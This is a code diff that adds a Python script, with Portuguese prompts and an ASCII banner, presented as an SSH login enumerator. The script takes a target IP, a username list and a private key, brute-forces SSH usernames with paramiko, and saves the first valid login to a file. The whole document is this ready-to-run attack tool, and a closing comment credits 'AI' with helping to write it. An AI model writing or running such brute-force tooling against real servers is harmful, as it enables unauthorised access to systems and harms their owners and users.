@@ -1,0 +1,64 @@
+import paramiko
+import os
+import time
+from colorama import Fore, Style
+
+def banner():
+    print(Fore.CYAN + """
+███████╗███████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
+██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+███████╗███████╗███████║       ██║   ██║   ██║██║   ██║██║     
+╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║   ██║██║     
+███████║███████║██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
+╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+    """ + Style.RESET_ALL)
+    print(Fore.YELLOW + "[*] SSH Login Enumerator - Brute Force com ID_RSA!" + Style.RESET_ALL)
+
+def bfssh(ip, ul, kp):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    with open(ul, "r") as file:
+        users = [line.strip() for line in file]
+
+    th = len(users)
+    print(Fore.YELLOW + f"\n[*] {th} usuários carregados para teste..." + Style.RESET_ALL)
+
+    for i, user in enumerate(users):
+        os.system("clear") 
+        print(Fore.CYAN + f"Tentando usuário ({i+1}/{th}): {user}..." + Style.RESET_ALL)
+
+        try:
+            ssh.connect(ip, username=user, key_filename=kp, timeout=5)
+            print(Fore.GREEN + f"\n[+] Sucesso! Usuário válido: {user}" + Style.RESET_ALL)
+
+            rf = f"{user}_id_rsa"
+            with open(rf, "w") as f:
+                f.write(f"IP: {ip}\nUsuário: {user}\nChave: {kp}\n")
+            print(Fore.YELLOW + f"[!] Resultado salvo em: {rf}" + Style.RESET_ALL)
+            break
+
+        except paramiko.AuthenticationException:
+            print(Fore.RED + f"[-] {user}: Autenticação falhou." + Style.RESET_ALL)
+            time.sleep(0.5)  
+
+        except Exception as e:
+            print(Fore.RED + f"[!] Erro: {e}" + Style.RESET_ALL)
+            break
+
+    else:
+        print(Fore.RED + "\n[!] Nenhum usuário válido encontrado." + Style.RESET_ALL)
+
+    ssh.close()
+
+if __name__ == "__main__":
+    banner()
+    ip = input(Fore.YELLOW + "Digite o IP do servidor SSH: " + Style.RESET_ALL)
+    ul = input(Fore.YELLOW + "Digite o arquivo com a lista de usuários: " + Style.RESET_ALL)
+    kp = input(Fore.YELLOW + "Digite o caminho da chave privada (id_rsa): " + Style.RESET_ALL)
+
+    bfssh(ip, ul, kp)
+
+
+
+#gslukao e 'AI' (a união faz açucar e nos improvisa)
